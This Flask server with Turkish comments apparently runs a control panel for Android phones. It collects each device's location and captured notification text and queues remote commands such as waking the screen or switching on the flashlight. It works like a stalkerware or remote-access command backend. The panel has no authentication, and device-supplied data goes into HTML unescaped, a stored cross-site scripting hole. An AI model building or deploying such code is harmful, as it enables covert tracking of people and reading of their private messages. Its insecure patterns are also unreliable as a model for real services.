from flask import Flask, request

app = Flask(__name__)

# Cihazları ve verilerini tutan ana sözlük
# Yapı: {"cihaz_id": {"konum": "...", "bildirim": "...", "komut": "0"}}
devices = {}

@app.route('/update', methods=['POST'])
def update():
    # Android'den gelen cihaz kimliğini al
    device_id = request.form.get('device_id')
    
    # Güvenlik: Cihaz ID'si yoksa işlem yapma
    if not device_id:
        return "Missing device_id", 400
    
    # Cihaz daha önce hiç kayıt edilmemişse, başlangıç değerleriyle oluştur
    if device_id not in devices:
        devices[device_id] = {
            "konum": "Bekleniyor...", 
            "bildirim": "Bildirim yok...", 
            "komut": "0"
        }
    
    # Gelen verileri güncelle (varsa güncelle, yoksa mevcut değer kalsın)
    if 'lat' in request.form:
        devices[device_id]["konum"] = request.form.get('lat')
    if 'bildirim' in request.form:
        devices[device_id]["bildirim"] = request.form.get('bildirim')
        
    return "OK", 200

@app.route('/get-command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id')
    
    # Eğer cihaz sistemde kayıtlıysa komutu gönder
    if device_id in devices:
        cmd = devices[device_id]["komut"]
        # Komut gönderildikten sonra sıfırla (tek seferlik çalışma prensibi)
        if cmd != "0":
            devices[device_id]["komut"] = "0"
        return cmd
    
    return "0"

@app.route('/set-command', methods=['POST'])
def set_command():
    device_id = request.form.get('device_id')
    cmd = request.form.get('cmd')
    
    # Sadece kayıtlı cihazlara komut gönderilmesine izin ver
    if device_id in devices and cmd in ["0", "1", "2"]:
        devices[device_id]["komut"] = cmd
        return f"Komut ({cmd}) {device_id} için ayarlandı. <br><a href='/get-status'>Geri Dön</a>"
    
    return "Hata: Cihaz bulunamadı veya geçersiz komut.", 400

@app.route('/get-status', methods=['GET'])
def get_status():
    # Arayüzü oluştur
    html = """
    <html>
    <head>
        <meta charset='UTF-8'>
        <meta http-equiv='refresh' content='5'>
        <title>Zewnd Kontrol Paneli</title>
    </head>
    <body style='font-family:sans-serif; padding:20px; background-color:#f4f4f9;'>
        <h1>Bağlı Cihaz Sayısı: {len_devices}</h1>
    """.format(len_devices=len(devices))
    
    # Her cihaz için kart oluştur
    for d_id, info in devices.items():
        html += f"""
        <div style="border:1px solid #ccc; padding:15px; margin-bottom:15px; border-radius:10px; background-color:white;">
            <h3 style="margin-top:0;">Cihaz ID: {d_id}</h3>
            <p>📍 <b>Konum:</b> {info['konum']}</p>
            <p>🔔 <b>Son Bildirim:</b> {info['bildirim']}</p>
            <form action="/set-command" method="POST">
                <input type="hidden" name="device_id" value="{d_id}">
                <button name="cmd" value="1" style="padding:10px; cursor:pointer;">Ekranı Uyandır</button>
                <button name="cmd" value="2" style="padding:10px; cursor:pointer;">Feneri Aç</button>
            </form>
        </div>
        """
    html += "</body></html>"
    return html

if __name__ == '__main__':
    # Render gibi platformlarda host 0.0.0.0 olmalı
    app.run(host='0.0.0.0', port=10000)
